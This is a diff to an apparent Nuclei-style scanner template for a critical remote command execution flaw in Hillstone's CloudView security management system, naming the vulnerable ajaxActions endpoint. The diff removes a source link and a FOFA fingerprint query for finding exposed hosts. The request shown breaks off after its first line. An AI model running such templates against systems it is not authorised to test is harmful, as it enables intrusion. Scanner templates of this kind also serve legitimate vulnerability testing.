@@ -3,14 +3,8 @@ info:
   name: 山石网科云鉴安全管理系统ajaxActions接口处存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d4c0fc37715e645234aa30e0e53508a6
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: d4c0fc37715e645234aa30e0e53508a6
-    fofa: + fofa`body=山石云鉴主机安全管理系统||icon_hash="572290418"`
 http:
 - raw:
   - 'GET /master/ajaxActions/getTokenAction.php HTTP/1.1
